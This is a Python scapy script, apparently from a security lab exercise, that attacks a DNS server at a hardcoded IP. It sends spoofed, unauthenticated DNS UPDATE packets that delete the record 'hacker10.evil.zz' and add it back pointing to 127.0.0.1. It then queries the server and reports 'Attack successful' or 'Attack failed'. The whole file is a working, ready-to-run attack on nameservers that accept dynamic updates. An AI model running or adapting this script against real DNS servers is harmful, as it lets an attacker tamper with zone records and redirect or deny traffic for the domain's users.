import sys
import time
from faker import Faker
from scapy.all import *
from scapy.layers.dns import *
from scapy.layers.inet import IP, ICMP, TCP

faker = Faker()

# IP
src = faker.ipv4()
dst = "152.96.7.8"

# UDP
sport = 5353
dport = 53

# DNS
rr = "hacker10.evil.zz"
type="A"
rrdata = "127.0.0.1"
zone = rr[rr.find(".") + 1:]
ttl = 60 * 60 * 24

def isRecordPresent(ns, t, dns):
    answer = sr1(IP(dst=ns)/UDP(dport=53)/DNS(
        rd=1,
        qd=DNSQR(qname=dns)),
        verbose=0)
    return hasattr(answer[DNS].an, "rdata")

print("Using source IP: {0}".format(src))
print("Sending delete for existing RRs")

delpacket=IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / DNS(
        opcode=5, # Update
        rd=0, 
        qd=[DNSQR(qname=zone, qtype="SOA")], 
        an=[DNSRR(rrname=rr, type=255, rclass="ANY", ttl=0, rdata="")],
        ns=[DNSRR(rrname=rr, type=255, rclass="ANY", ttl=0, rdata="")])
send(delpacket)

print("Adding: {0} {1} IN {2} {3}".format(rr,ttl, type, rrdata))
addpacket=IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / DNS(
        opcode=5, # Update
        rd=0,
        qd=[DNSQR(qname=zone, qtype="SOA")],
        an=[DNSRR(rrname=rr, type=255, rclass=0x00fe, ttl=0, rdata="")],
        ns=[DNSRR(rrname=rr, type=type, ttl=ttl, rdata=rrdata)])

send(addpacket)

if isRecordPresent(dst, type, rr):
    print("Attack successful")
else:
    print("Attack failed")
